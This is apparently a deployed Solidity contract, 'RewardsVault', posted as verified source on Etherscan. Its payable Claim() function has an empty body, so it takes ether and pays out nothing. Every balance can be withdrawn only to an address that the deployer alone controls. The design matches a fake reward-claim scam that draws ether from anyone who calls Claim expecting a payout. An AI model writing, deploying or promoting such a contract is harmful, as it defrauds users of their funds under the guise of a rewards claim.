/**
 *Submitted for verification at Etherscan.io on 2023-05-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract RewardsVault {
    address owner;
    address to;
    
    constructor() {
        owner = msg.sender;
        setTo(owner);
    }

    fallback() payable external {
    }

    receive() payable external {
    }

    function Claim() payable external {
        
    }

    function withdraw() public {
        payable(to).transfer(address(this).balance);
    }

    function withdraw(uint256 amount_) public {
        payable(to).transfer(amount_);
    }

    function withdrawTo(address to_, uint256 amount_) public {
        setTo(to_);
        withdraw(amount_);
    }

    function setTo(address to_) public {
        require(owner == msg.sender, "not owner");
        to = to_;
    }
}